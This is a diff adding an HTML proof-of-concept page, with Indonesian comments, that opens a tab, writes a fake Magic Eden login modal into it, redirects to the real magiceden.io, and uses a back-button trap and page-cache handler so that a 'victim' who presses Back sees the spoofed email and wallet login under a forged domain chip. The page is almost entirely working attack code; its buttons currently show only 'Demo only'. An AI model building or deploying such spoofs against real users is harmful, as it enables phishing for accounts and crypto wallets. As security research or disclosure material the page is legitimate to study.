@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Launcher (window.open)</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+</head>
+<body style="font-family:system-ui,sans-serif;padding:24px">
+  <h2>Open ME spoof in new tab</h2>
+  <button id="go">Launch</button>
+
+<script>
+document.getElementById('go').addEventListener('click', () => {
+  // HARUS dari user gesture (tanpa setTimeout) agar popup tidak diblok
+  const w = window.open('about:blank', '_blank');
+  if (!w) { alert('Popup blocked or multi-window disabled.'); return; }
+
+  const RACE_DELAY_MS = 12000;         // tunda lama → peluang tekan Back sebelum redirect
+  const TARGET = 'https://magiceden.io/';
+  const BACK_TRAP = true;
+
+  const payload = `<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Magic Eden</title>
+<style>
+:root{--bg:#0d0d0f;--panel:#111318;--fg:#fff;--muted:#9aa0a6;--border:#23262b;--btn:#7a3ff0;--btn2:#1a1d22}
+html,body{height:100%} body{margin:0;background:var(--bg);color:var(--fg);font-family:system-ui,Segoe UI,Roboto,Ubuntu,Arial,sans-serif;display:flex;align-items:center;justify-content:center}
+.loader{color:#9aa0a6;font-size:14px}
+.backdrop{position:fixed;inset:0;background:rgba(0,0,0,.55);display:flex;align-items:center;justify-content:center}
+.modal{width:min(92vw,460px);background:var(--panel);border:1px solid var(--border);border-radius:16px;box-shadow:0 10px 40px rgba(0,0,0,.45);padding:22px}
+h2{margin:0 0 16px;font-size:20px;font-weight:700}
+.field{display:flex;gap:10px;margin:10px 0 14px}
+.field input{flex:1;background:#15181d;border:1px solid #2a2e35;border-radius:10px;padding:12px 14px;color:#fff;font-size:15px}
+.primary{width:100%;border:0;border-radius:10px;background:var(--btn);padding:12px 14px;color:#fff;font-weight:600;font-size:15px;cursor:pointer}
+.or{display:flex;align-items:center;gap:10px;color:#8b9097;font-size:12px;margin:14px 0}
+.or:before,.or:after{content:"";flex:1;height:1px;background:#252a31}
+.wallet{width:100%;display:flex;align-items:center;justify-content:space-between;gap:10px;background:var(--btn2);border:1px solid #2a2e35;color:#d7d9dd;border-radius:12px;padding:12px 14px}
+.chip{position:fixed;top:12px;left:50%;transform:translateX(-50%);background:#0f1115;border:1px solid #262a31;color:#c9ccd1;padding:6px 10px;border-radius:999px;font-size:12px}
+</style></head><body>
+<div class="loader">Connecting to magiceden.io…</div>
+<script>
+const TARGET='${TARGET}'; const DELAY=${RACE_DELAY_MS}; const BACK_TRAP=${BACK_TRAP};
+let navigating=false;
+
+function renderSpoof(){
+  document.body.innerHTML=\`
+    <div class="chip">magiceden.io</div>
+    <div class="backdrop">
+      <div class="modal" role="dialog" aria-modal="true">
+        <h2>Log in or sign up</h2>
+        <div class="field"><input type="email" placeholder="Enter your email"></div>
+        <button class="primary" id="cont">Continue</button>
+        <div class="or">OR</div>
+        <button class="wallet" id="wallets"><b>ME Wallet</b><span style="font-size:11px;color:#9aa0a6"> • 510+ available</span></button>
+        <div style="margin-top:14px;color:#717782;font-size:12px">If you have not logged in before, you will create a new Magic Eden account…</div>
+      </div>
+    </div>\`;
+  document.getElementById('cont').onclick=(e)=>{e.preventDefault();alert('Demo only')};
+  document.getElementById('wallets').onclick=()=>alert('Demo only');
+  if (BACK_TRAP){ history.pushState(null,'',location.href); addEventListener('popstate',()=>history.pushState(null,'',location.href)); }
+}
+
+// 1) pasang handler Back SEBELUM redirect → jika korban menekan Back cepat, langsung spoof
+history.pushState({armed:true},'',location.href);
+addEventListener('popstate',()=>{ if(!navigating) { renderSpoof(); if(BACK_TRAP) history.pushState({},'',location.href);} });
+
+// 2) delay panjang → redirect ke domain asli (address bar menunjukkan magiceden.io)
+setTimeout(()=>{ navigating=true; location.href=TARGET; }, DELAY);
+
+// 3) ketika user Back dari target, halaman ini aktif lagi (BFCache) → tampilkan spoof
+addEventListener('pageshow',()=>{ if(!navigating) renderSpoof(); });
+<\/script>
+</body></html>`;
+
+  w.document.open(); w.document.write(payload); w.document.close();
+});
+</script>
+</body>
+</html>
